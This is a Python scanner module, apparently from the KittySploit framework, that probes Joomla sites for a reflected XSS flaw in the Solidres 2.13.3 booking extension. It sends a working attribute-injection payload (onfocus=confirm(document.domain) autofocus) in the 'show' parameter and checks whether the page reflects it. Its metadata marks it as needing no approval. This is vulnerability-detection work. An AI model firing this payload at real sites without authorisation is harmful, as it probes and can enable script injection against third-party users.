#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla extension for Solidres - Online Booking System & Reservation Software is vulnerable to XSS in GET param."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla Solidres 2.13.3 - Cross-Site Scripting Detection',
        'description': "Joomla extension for Solidres - Online Booking System & Reservation Software is vulnerable to XSS in GET parameter 'show'.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'joomla', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51638',
            'https://cxsecurity.com/issue/WLB-2023070080',
            'https://cyberlegion.io/joomla-solidres-2-13-3-cross-site-scripting/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('onfocus="confirm(document.domain)"autofocus', 'com_solidres',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Joomla Solidres 2.13.3 - Cross-Site Scripting detected",
                path='/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k',
            )
            return True
        return False

